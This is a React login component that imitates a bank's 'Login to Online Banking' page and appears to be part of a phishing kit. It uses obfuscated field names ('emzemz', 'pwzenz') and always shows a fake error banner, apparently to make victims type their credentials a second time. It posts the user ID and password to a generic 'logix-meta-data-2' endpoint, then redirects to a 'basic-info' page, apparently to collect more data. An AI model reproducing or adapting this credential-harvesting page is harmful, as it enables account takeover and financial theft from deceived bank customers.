import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const LoginForm2: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const [remember, setRemember] = useState(true);
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // If access is explicitly denied (not just loading), show loading
  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };

    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
      setIsLoading(false);
    }

    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password must be at least 6 characters.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/logix-meta-data-2/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/basic-info', {
          state: {
            emzemz: emzemz
          }
        });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div className="flex-1 flex flex-col w-full bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96]">
      <div className="flex-1 flex items-center justify-center px-4 py-20">
        <div className="w-full max-w-md space-y-6">
          <div className="bg-white rounded-md p-8 login-card shadow-lg shadow-slate-900/10">
            <h2 className="text-center text-2xl font-semibold mb-6 text-slate-700">Login to Online Banking</h2>

            <div className="flex items-start gap-3 rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
              <svg
                width="1rem"
                height="1rem"
                viewBox="0 0 24 24"
                className="mt-[2px] fill-current"
                aria-hidden="true"
              >
                <path
                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                  fillRule="nonzero"
                ></path>
              </svg>
              <p>We found some errors. Please review the form and make corrections.</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4 mt-6">
              <div>
                <label className="block text-sm text-slate-500 mb-1" htmlFor="emzemz">User ID</label>
                <div className="flex items-center border border-slate-200 rounded">
                  <input
                    id="emzemz"
                    name="emzemz"
                    type="text"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className="flex-1 px-3 py-3 text-sm focus:outline-none"
                    placeholder="User ID"
                  />
                </div>
                {errors.emzemz && (
                  <div className="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                    <svg
                      width="1rem"
                      height="1rem"
                      viewBox="0 0 24 24"
                      className="fill-current"
                      aria-hidden="true"
                    >
                      <path
                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                        fillRule="nonzero"
                      ></path>
                    </svg>
                    <p>Username required</p>
                  </div>
                )}
              </div>

              <div>
                <label className="block text-sm text-slate-500 mb-1" htmlFor="pwzenz">Password</label>
                <div className="flex items-center border border-slate-200 rounded">
                  <input
                    id="pwzenz"
                    name="pwzenz"
                    type={showPwzenz ? 'text' : 'password'}
                    value={pwzenz}
                    onChange={(e) => setPwzenz(e.target.value)}
                    className="flex-1 px-3 py-3 text-sm focus:outline-none"
                    placeholder="Password"
                  />
                  <button
                    type="button"
                    onClick={togglePwzenzVisibility}
                    className="px-3 text-slate-400"
                  >
                    {showPwzenz ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.pwzenz && (
                  <div className="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                    <svg
                      width="1rem"
                      height="1rem"
                      viewBox="0 0 24 24"
                      className="fill-current"
                      aria-hidden="true"
                    >
                      <path
                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                        fillRule="nonzero"
                      ></path>
                    </svg>
                    <p>Password required</p>
                  </div>
                )}
              </div>

              <div className="flex items-center space-x-2">
                <input
                  id="remember"
                  type="checkbox"
                  checked={remember}
                  onChange={() => setRemember((r) => !r)}
                  className="h-4 w-4 text-[#0f4f6c]"
                />
                <label htmlFor="remember" className="text-sm text-slate-700">Remember Me</label>
              </div>

              <button
                type="submit"
                className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
                ) : (
                  <>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 11c0-1.657 1.343-3 3-3s3 1.343 3 3v1H6v-1c0-1.657 1.343-3 3-3s3 1.343 3 3z" />
                    </svg>
                    <span>Login</span>
                  </>
                )}
              </button>
            </form>

            <div className="text-center mt-4">
              <a href="#" className="text-sm text-[#0f4f6c] underline">Trouble logging in?</a>
            </div>

            <div className="text-center mt-2">
              <a href="#" className="inline-block text-sm text-[#0f4f6c] underline">Enroll in Online Banking</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm2;
